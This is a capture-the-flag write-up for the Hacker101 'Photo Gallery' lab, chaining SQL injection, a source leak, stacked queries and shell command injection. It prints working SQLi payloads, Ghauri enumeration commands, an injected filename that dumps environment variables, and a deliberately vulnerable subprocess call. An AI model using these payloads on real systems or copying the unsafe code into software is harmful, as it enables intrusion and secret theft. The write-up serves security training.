# 🖼️ Photo Gallery

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `3/3` ✅

---

## ⛓️ Attack Chain

```
SQL Injection  →  Source Code Leak  →  Stacked Queries  →  Command Injection  →  Flags
```

---

## 🔍 Application Overview

The app loads three images via `/fetch?id=1`. The third image (`id=3`) throws a **500 error** — the first hint of injection.

The homepage runs a `du` shell command using filenames pulled **directly from the database** with `shell=True` and zero sanitization. That's the entire vulnerability.

---

## 🚩 Flag 0 — Database Enumeration

Enumerated the database using **Ghauri**. The `filename` column of `id=3` in the `photos` table held the flag instead of a real filename.

```bash
ghauri -r req.txt --dbs
ghauri -r req.txt -D level5 --tables
ghauri -r req.txt -D level5 -T photos --dump
```

> 💡 Database: `level5` — Tables: `albums`, `photos`

---

## 🚩 Flag 1 — Source Code Leak

The `/fetch` endpoint reads a file based on whatever the SQL query returns. By injecting a UNION that returns `main.py`, the server hands over its own source code.

```sql
/fetch?id=-1 UNION SELECT 'main.py' --
```

Flag was **hardcoded in a comment** inside the `/fetch` route.

---

## 🚩 Flag 2 — Command Injection

The vulnerable line in `main.py`:

```python
subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True
)
```

Filenames from the database flow directly into a shell command. Update the filename of `id=3` to a payload, visit the homepage, and it executes.

**Step 1 — Inject malicious filename:**
```sql
/fetch?id=1; UPDATE photos SET filename='; env > ./env.txt' WHERE id=3; COMMIT; --
```

**Step 2 — Read the output:**
```sql
/fetch?id=-1 UNION SELECT 'env.txt' --
```

Flag was inside the environment variables printed to the file.

> ⚠️ **`COMMIT` is required.** MySQL has autocommit disabled here — without it the UPDATE never persists and the payload never runs.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| SQL Injection | `/fetch` builds its query via string concatenation — no prepared statements |
| Command Injection | Homepage passes filenames into `subprocess` with `shell=True` — no sanitization |

Both vulnerabilities chain together: **SQLi** gives you DB write access, **command injection** gives you code execution.

---

## 📋 Payloads

```sql
-- Read source code
/fetch?id=-1 UNION SELECT 'main.py' --

-- Inject malicious filename
/fetch?id=1; UPDATE photos SET filename='; env > ./env.txt' WHERE id=3; COMMIT; --

-- Read command output
/fetch?id=-1 UNION SELECT 'env.txt' --
```
